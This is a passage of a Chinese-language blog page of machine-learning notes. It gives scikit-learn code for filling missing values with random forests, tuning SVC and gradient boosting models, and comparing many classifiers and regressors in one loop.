class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 填补缺失</span></span><br><span class="line">X_missing_reg = X_missing.copy()</span><br><span class="line">sortindex = np.argsort(X_missing_reg.isnull().<span class="built_in">sum</span>(axis=<span class="number">0</span>)).values</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sortindex:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#构建我们的新特征矩阵和新标签</span></span><br><span class="line">    df = X_missing_reg</span><br><span class="line">    fillc = df.iloc[:,i]</span><br><span class="line">    df = pd.concat([df.iloc[:,df.columns != i],pd.DataFrame(y_full)],axis=<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#在新特征矩阵中，对含有缺失值的列，进行0的填补</span></span><br><span class="line">    df_0 =SimpleImputer(missing_values=np.nan,</span><br><span class="line">                        strategy=<span class="string">&#x27;constant&#x27;</span>,fill_value=<span class="number">0</span>).fit_transform(df)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#找出我们的训练集和测试集</span></span><br><span class="line">    Ytrain = fillc[fillc.notnull()]</span><br><span class="line">    Ytest = fillc[fillc.isnull()]</span><br><span class="line">    Xtrain = df_0[Ytrain.index,:]</span><br><span class="line">    Xtest = df_0[Ytest.index,:]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#用随机森林回归来填补缺失值</span></span><br><span class="line">    rfc = RandomForestRegressor(n_estimators=<span class="number">100</span>)</span><br><span class="line">    rfc = rfc.fit(Xtrain, Ytrain)</span><br><span class="line">    Ypredict = rfc.predict(Xtest)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#将填补好的特征返回到我们的原始的特征矩阵中</span></span><br><span class="line">    X_missing_reg.loc[X_missing_reg.iloc[:,i].isnull(),X_missing_reg.columns[i]] = Ypredict</span><br></pre></td></tr></table></figure><h3><span id="梯度提升森林">梯度提升森林</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gbc = GradientBoostingClassifier().fit(Xtrain,Ytrain)</span><br><span class="line">gbc.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 学习曲线</span></span><br><span class="line">%%time</span><br><span class="line">n = np.linspace(<span class="number">329</span>,<span class="number">339</span>,<span class="number">10</span>) </span><br><span class="line">score=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">    gbc = GradientBoostingClassifier(n_estimators=<span class="built_in">int</span>(i)).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(gbc.score(Xtest,Ytest))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), <span class="built_in">int</span>(n[score.index(<span class="built_in">max</span>(score))]))</span><br><span class="line">plt.plot(n,score)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3><span id="svc支持向量机需要标准化-找少数类相对擅长">SVC(支持向量机需要标准化) 找少数类相对擅长</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">X = StandardScaler().fit_transform(X)<span class="comment">#将数据转化为0,1正态分布</span></span><br><span class="line"></span><br><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(X,y,test_size=<span class="number">0.3</span>,random_state=<span class="number">420</span>)</span><br><span class="line"> </span><br><span class="line">Kernel = [<span class="string">&quot;linear&quot;</span>,<span class="string">&quot;poly&quot;</span>,<span class="string">&quot;rbf&quot;</span>,<span class="string">&quot;sigmoid&quot;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> kernel <span class="keyword">in</span> Kernel:</span><br><span class="line">    clf= SVC(kernel = kernel</span><br><span class="line">             , gamma=<span class="string">&quot;auto&quot;</span></span><br><span class="line">             , degree = <span class="number">1</span></span><br><span class="line">             , cache_size=<span class="number">5000</span></span><br><span class="line">            ).fit(Xtrain,Ytrain)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The accuracy under kernel %s is %f&quot;</span> % (kernel,clf.score(Xtest,Ytest)))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 调试rbf</span></span><br><span class="line">score = []</span><br><span class="line">gamma_range = np.logspace(-<span class="number">10</span>, <span class="number">1</span>, <span class="number">50</span>) <span class="comment">#返回在对数刻度上均匀间隔的数字</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> gamma_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">&quot;rbf&quot;</span>,gamma = i,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), gamma_range[score.index(<span class="built_in">max</span>(score))])</span><br><span class="line">plt.plot(gamma_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网格搜索rbf</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> StratifiedShuffleSplit<span class="comment">#用于支持带交叉验证的网格搜索</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> GridSearchCV<span class="comment">#带交叉验证的网格搜索</span></span><br><span class="line"> </span><br><span class="line">time0 = time()</span><br><span class="line"> </span><br><span class="line">gamma_range = np.logspace(-<span class="number">10</span>,<span class="number">1</span>,<span class="number">20</span>)</span><br><span class="line">coef0_range = np.linspace(<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line"> </span><br><span class="line">param_grid = <span class="built_in">dict</span>(gamma = gamma_range</span><br><span class="line">                  ,coef0 = coef0_range)</span><br><span class="line">cv = StratifiedShuffleSplit(n_splits=<span class="number">5</span>, test_size=<span class="number">0.3</span>, random_state=<span class="number">420</span>)<span class="comment">#将数据分为5份，5份数据中测试集占30%</span></span><br><span class="line">grid = GridSearchCV(SVC(kernel = <span class="string">&quot;poly&quot;</span>,degree=<span class="number">1</span>,cache_size=<span class="number">5000</span></span><br><span class="line">                        ,param_grid=param_grid</span><br><span class="line">                        ,cv=cv)</span><br><span class="line">grid.fit(X, y)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The best parameters are %s with a score of %0.5f&quot;</span> % (grid.best_params_, </span><br><span class="line">grid.best_score_))</span><br><span class="line"><span class="built_in">print</span>(time()-time0)</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"><span class="comment">#调线性核函数</span></span><br><span class="line">score = []</span><br><span class="line">C_range = np.linspace(<span class="number">0.01</span>,<span class="number">30</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">&quot;linear&quot;</span>,C=i,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), C_range[score.index(<span class="built_in">max</span>(score))])</span><br><span class="line">plt.plot(C_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#换rbf</span></span><br><span class="line">score = []</span><br><span class="line">C_range = np.linspace(<span class="number">0.01</span>,<span class="number">30</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">&quot;rbf&quot;</span>,C=i,gamma = <span class="number">0.012742749857031322</span>,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), C_range[score.index(<span class="built_in">max</span>(score))])</span><br><span class="line">plt.plot(C_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#进一步细化</span></span><br><span class="line">score = []</span><br><span class="line">C_range = np.linspace(<span class="number">5</span>,<span class="number">7</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C_range:</span><br><span class="line">    clf = SVC(kernel=<span class="string">&quot;rbf&quot;</span>,C=i,gamma = </span><br><span class="line"><span class="number">0.012742749857031322</span>,cache_size=<span class="number">5000</span>).fit(Xtrain,Ytrain)</span><br><span class="line">    score.append(clf.score(Xtest,Ytest))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), C_range[score.index(<span class="built_in">max</span>(score))])</span><br><span class="line">plt.plot(C_range,score)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"><span class="comment">#解决样本不均衡  class_weight（一般比较少用，误伤严重）</span></span><br><span class="line"><span class="comment">#设定class_weight</span></span><br><span class="line">wclf = svm.SVC(kernel=<span class="string">&#x27;linear&#x27;</span>, class_weight=&#123;<span class="number">1</span>: <span class="number">10</span>&#125;)</span><br><span class="line">wclf.fit(X, y)</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"><span class="comment"># 召回率</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> roc_auc_score, recall_score</span><br><span class="line">resutl = clf.predict(Xtest)</span><br><span class="line">recall = recall_score(Ytest,result)                    </span><br><span class="line"><span class="comment"># 提高召回率</span></span><br><span class="line">class_weight = &#123;<span class="number">1</span>:<span class="number">10</span>&#125; <span class="comment"># 类别：权重</span></span><br><span class="line"><span class="comment"># 平衡</span></span><br><span class="line">class_weigth =<span class="string">&#x27;balanced&#x27;</span></span><br><span class="line">                    </span><br><span class="line">                    </span><br><span class="line"><span class="comment"># 调参</span></span><br><span class="line">irange = np.linspace(<span class="number">0.01</span>,<span class="number">0.05</span>,<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> irange:</span><br><span class="line">    times = time()</span><br><span class="line">    clf = SVC(kernel = <span class="string">&quot;linear&quot;</span></span><br><span class="line">             ,gamma=<span class="string">&quot;auto&quot;</span></span><br><span class="line">             ,cache_size = <span class="number">5000</span></span><br><span class="line">             ,class_weight = &#123;<span class="number">1</span>:<span class="number">1</span>+i&#125;</span><br><span class="line">             ).fit(Xtrain, Ytrain)</span><br><span class="line">    result = clf.predict(Xtest)</span><br><span class="line">    score = clf.score(Xtest,Ytest)</span><br><span class="line">    recall = recall_score(Ytest, result)</span><br><span class="line">    auc = roc_auc_score(Ytest,clf.decision_function(Xtest))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;under ratio 1:%f testing accuracy %f, recall is %f&#x27;, auc is %f&quot;</span> % (<span class="number">1</span>+i,score,recall,auc))</span><br><span class="line">    <span class="built_in">print</span>(datetime.datetime.fromtimestamp(time()-times).strftime(<span class="string">&quot;%M:%S:%f&quot;</span>))                    </span><br></pre></td></tr></table></figure><h3><span id="分类onekey">分类OneKey</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">%%time</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression,RidgeClassifier,SGDClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier,GradientBoostingClassifier,AdaBoostClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC,LinearSVC</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_models</span>(<span class="params">models=&#123;&#125;</span>):</span><br><span class="line">    models[<span class="string">&#x27;LogisticRegression&#x27;</span>]=LogisticRegression()</span><br><span class="line">    models[<span class="string">&#x27;RidgeClassifier&#x27;</span>]=RidgeClassifier()</span><br><span class="line">    models[<span class="string">&#x27;SGDClassifier&#x27;</span>]=SGDClassifier()</span><br><span class="line">    models[<span class="string">&#x27;RandomForestClassifier&#x27;</span>]=RandomForestClassifier()</span><br><span class="line">    models[<span class="string">&#x27;GradientBoostingClassifier&#x27;</span>]=GradientBoostingClassifier()</span><br><span class="line">    models[<span class="string">&#x27;AdaBoostClassifier&#x27;</span>]=AdaBoostClassifier()</span><br><span class="line">    models[<span class="string">&#x27;KNN&#x27;</span>] = KNeighborsClassifier()</span><br><span class="line">    models[<span class="string">&#x27;GaussianNB&#x27;</span>] =  GaussianNB()</span><br><span class="line">    models[<span class="string">&#x27;SVC&#x27;</span>]=SVC()</span><br><span class="line">    models[<span class="string">&#x27;LinearSVC&#x27;</span>]=LinearSVC()</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipe</span>(<span class="params">model</span>):</span><br><span class="line">    s = [(<span class="string">&#x27;MinMaxScaler&#x27;</span>,MinMaxScaler()),(<span class="string">&#x27;model&#x27;</span>,model)]</span><br><span class="line">    <span class="keyword">return</span> Pipeline(steps=s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pred</span>(<span class="params">model,x</span>):</span><br><span class="line">    <span class="keyword">return</span> model.predict(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fit</span>(<span class="params">model,x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> model.fit(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid</span>(<span class="params">model,x,y,cv=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(model,x,y,cv=cv)</span><br><span class="line"></span><br><span class="line">s=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> n,m <span class="keyword">in</span> get_models().items():</span><br><span class="line">    pipe = make_pipe(m)</span><br><span class="line">    s[n] = valid(pipe,x,y).mean()</span><br><span class="line">    </span><br><span class="line">order = <span class="built_in">sorted</span>(s.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line">order</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plot_data = pd.DataFrame(data=order)</span><br><span class="line">plot_data.columns = [<span class="string">&#x27;algo&#x27;</span>,<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">plot_data.set_index(<span class="string">&#x27;algo&#x27;</span>).plot.bar(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">plt.xticks(rotation=<span class="number">360</span>)</span><br><span class="line"><span class="string">f&#x27;%s is the best,score is %f&#x27;</span>%(order[<span class="number">0</span>][<span class="number">0</span>],order[<span class="number">0</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipeline</span>(<span class="params">model,X, Y</span>):</span><br><span class="line">steps = <span class="built_in">list</span>()</span><br><span class="line"><span class="comment"># standardization</span></span><br><span class="line">steps.append((<span class="string">&#x27;standardize&#x27;</span>, StandardScaler()))</span><br><span class="line"><span class="comment"># normalization</span></span><br><span class="line">steps.append((<span class="string">&#x27;normalize&#x27;</span>, MinMaxScaler()))</span><br><span class="line"><span class="comment"># the model</span></span><br><span class="line">steps.append((<span class="string">&#x27;model&#x27;</span>, model))</span><br><span class="line"><span class="comment"># create pipeline</span></span><br><span class="line">pipeline = Pipeline(steps)</span><br><span class="line"><span class="keyword">return</span> cross_val_score(pipeline,X,Y,cv=<span class="number">4</span>).mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    dic[name] = make_pipeline(model,X,Y)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;model %s is done,score is %f&#x27;</span>%(name,dic[name]))</span><br><span class="line">order=<span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="分类调参onekey">分类调参Onekey</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 回归</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 回归OneKey</span></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">%%time</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lasso</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Ridge</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> ElasticNet</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> HuberRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lars</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LassoLars</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> PassiveAggressiveRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> RANSACRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> SGDRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestRegressor,GradientBoostingRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># prepare a list of ml models</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_models</span>(<span class="params">models=<span class="built_in">dict</span>(<span class="params"></span>)</span>):</span><br><span class="line">    <span class="comment"># linear models</span></span><br><span class="line">    models[<span class="string">&#x27;rfr&#x27;</span>]=RandomForestRegressor()</span><br><span class="line">    models[<span class="string">&#x27;gbr&#x27;</span>]=GradientBoostingRegressor()</span><br><span class="line">    models[<span class="string">&#x27;lr&#x27;</span>] = LinearRegression()</span><br><span class="line">    models[<span class="string">&#x27;lasso&#x27;</span>] = Lasso()</span><br><span class="line">    models[<span class="string">&#x27;ridge&#x27;</span>] = Ridge()</span><br><span class="line">    models[<span class="string">&#x27;en&#x27;</span>] = ElasticNet()</span><br><span class="line">    models[<span class="string">&#x27;huber&#x27;</span>] = HuberRegressor()</span><br><span class="line">    models[<span class="string">&#x27;lars&#x27;</span>] = Lars()</span><br><span class="line">    models[<span class="string">&#x27;llars&#x27;</span>] = LassoLars()</span><br><span class="line">    models[<span class="string">&#x27;pa&#x27;</span>] = PassiveAggressiveRegressor(max_iter=<span class="number">1000</span>, tol=<span class="number">1e-3</span>)</span><br><span class="line">    models[<span class="string">&#x27;ranscac&#x27;</span>] = RANSACRegressor()</span><br><span class="line">    models[<span class="string">&#x27;sgd&#x27;</span>] = SGDRegressor(max_iter=<span class="number">1000</span>, tol=<span class="number">1e-3</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Defined %d models&#x27;</span> % <span class="built_in">len</span>(models))</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"> </span><br><span class="line"><span class="comment"># create a feature preparation pipeline for a model</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipeline</span>(<span class="params">model</span>):</span><br><span class="line">    steps = <span class="built_in">list</span>()</span><br><span class="line">    <span class="comment"># standardization</span></span><br><span class="line">    steps.append((<span class="string">&#x27;standardize&#x27;</span>, StandardScaler()))</span><br><span class="line">    <span class="comment"># normalization</span></span><br><span class="line">    steps.append((<span class="string">&#x27;normalize&#x27;</span>, MinMaxScaler()))</span><br><span class="line">    <span class="comment"># the model</span></span><br><span class="line">    steps.append((<span class="string">&#x27;model&#x27;</span>, model))</span><br><span class="line">    <span class="comment"># create pipeline</span></span><br><span class="line">    pipeline = Pipeline(steps)</span><br><span class="line">    <span class="keyword">return</span> pipeline</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cross_validation</span>(<span class="params">pipeline,X,Y</span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(pipeline,X,Y,cv=<span class="number">10</span>).mean()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validation</span>(<span class="params">pipeline,Xtrain,Ytrain,Xtest,Ytest</span>):</span><br><span class="line">    pipeline.fit(Xtrain,Ytrain)</span><br><span class="line">    <span class="keyword">return</span> pipeline.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    pipeline = make_pipeline(model)</span><br><span class="line">    <span class="comment"># dic[name] = cross_validation(pipeline,Xtrain,Ytrain)</span></span><br><span class="line">    dic[name] = validation(pipeline,Xtrain,Ytrain,Xtest,Ytest)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;model %s is done,score is %f&#x27;</span>%(name,dic[name]))</span><br><span class="line">order=<span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">plot_data = pd.DataFrame(data=order)</span><br><span class="line">plot_data.columns = [<span class="string">&#x27;algo&#x27;</span>,<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">plot_data.set_index(<span class="string">&#x27;algo&#x27;</span>).plot.bar(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">plt.xticks(rotation=<span class="number">360</span>)</span><br><span class="line"><span class="string">f&#x27;%s is the best,score is %f&#x27;</span>%(order[<span class="number">0</span>][<span class="number">0</span>],order[<span class="number">0</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create a feature preparation pipeline for a model</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipeline</span>(<span class="params">model,Xtrain,Ytrain,Xtest,Ytest</span>):</span><br><span class="line">steps = <span class="built_in">list</span>()</span><br><span class="line"><span class="comment"># 